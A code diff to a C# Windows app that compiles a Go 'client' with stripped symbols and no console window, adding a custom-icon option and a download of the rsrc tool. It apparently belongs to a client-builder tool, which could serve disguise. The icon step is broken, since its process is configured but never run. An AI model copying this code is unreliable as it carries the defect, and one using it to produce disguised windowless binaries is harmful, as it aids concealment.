@@ -348,6 +348,13 @@ namespace KryakApp.Pages
             string tempBuildDir = Path.Combine(Path.GetTempPath(), "kryakclient-build");
             Directory.CreateDirectory(tempBuildDir);
 
+             AppNotification buildNotification = new AppNotificationBuilder()
+            .AddText("Build started")
+            .AddText("Compiling client, please wait...")
+            .BuildNotification();
+
+             AppNotificationManager.Default.Show(buildNotification);
+
             string tempGoPath = Path.Combine(tempBuildDir, "main.go");
             string tempModPath = Path.Combine(tempBuildDir, "go.mod");
             string tempSumPath = Path.Combine(tempBuildDir, "go.sum");
@@ -356,14 +363,26 @@ namespace KryakApp.Pages
             File.WriteAllText(tempModPath, ClientSourceCode.GetModCode());
             File.WriteAllText(tempSumPath, ClientSourceCode.GetSumCode());
 
-            AppNotification buildNotification = new AppNotificationBuilder()
-                .AddText("Build started")
-                .AddText("Compiling client, please wait...")
-                .BuildNotification();
+            if (CustomIconCheckBox.IsChecked == true)
+            {
+                if (!File.Exists(IconPathTextBox.Text.Trim()))
+                {
+                    await ShowSimpleDialogAsync("Build Failed", "Selected icon file does not exist.");
+                    return;
+                }
+                ProcessStartInfo iconInfo = new()
+                {
+                    FileName = goPath.Replace("go.exe", "rsrc.exe"),
+                    Arguments = $"-ico {IconPathTextBox.Text.Trim()} -o {Path.Combine(tempBuildDir, "rsrc.syso")}",
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    WorkingDirectory = tempBuildDir
+                };
+                }
 
-            AppNotificationManager.Default.Show(buildNotification);
-
-            ProcessStartInfo startInfo = new()
+                ProcessStartInfo startInfo = new()
             {
                 FileName = goPath,
                 Arguments = $"build -ldflags=\"-s -w -H windowsgui\" -trimpath -o \"{outputFile.Path}\" \"{tempGoPath}\"",
@@ -459,6 +478,10 @@ namespace KryakApp.Pages
                 Directory.CreateDirectory(extractPath);
                 System.IO.Compression.ZipFile.ExtractToDirectory(tempPath, extractPath);
                 File.Delete(tempPath);
+                string rsrcUrl = "https://github.com/akavel/rsrc/releases/download/v0.10.2/rsrc_windows_amd64.exe";
+                byte[] rsrcData = await client.GetByteArrayAsync(rsrcUrl);
+                string rsrcPath = Path.Combine(extractPath, "go", "bin", "rsrc.exe");
+                await File.WriteAllBytesAsync(rsrcPath, rsrcData);
                 return true;
             }
             catch
